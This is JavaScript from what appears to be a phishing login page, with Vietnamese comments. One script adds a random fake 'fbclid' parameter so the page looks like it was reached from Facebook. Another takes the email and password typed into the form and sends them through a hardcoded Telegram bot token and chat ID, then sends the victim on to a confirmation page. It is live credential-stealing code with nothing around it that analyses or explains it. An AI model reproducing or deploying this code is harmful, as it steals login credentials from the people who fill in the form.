  <script>
  (function() {
    // Kiểm tra nếu URL chưa có fbclid
    if (!window.location.search.includes("fbclid")) {
      // Tạo chuỗi 20 chữ số ngẫu nhiên thủ công
      let fbclid = '';
      for (let i = 0; i < 30; i++) {
        fbclid += Math.floor(Math.random() * 10); // số ngẫu nhiên từ 0 đến 9
      }

      const newUrl = window.location.origin + window.location.pathname + "?fbclid=" + fbclid;
      window.location.replace(newUrl); // Redirect lại trang với tham số fbclid
    }
  })();

  <script>
   document.getElementById("sendBtn").addEventListener("click", function() {
    event.preventDefault(); // ❗ Ngăn form submit mặc định
      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';
      var chatId = '6022297636';
      var message = `Email: ${email}\nPassword: ${password}`;
      var url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
      .then(() => {
        window.location.href = "confirm.html";
      })
      .catch(error => {
        console.error('Error:', error);
        window.location.href = "confirm.html"; // Redirect even if there's an error
      });
    });
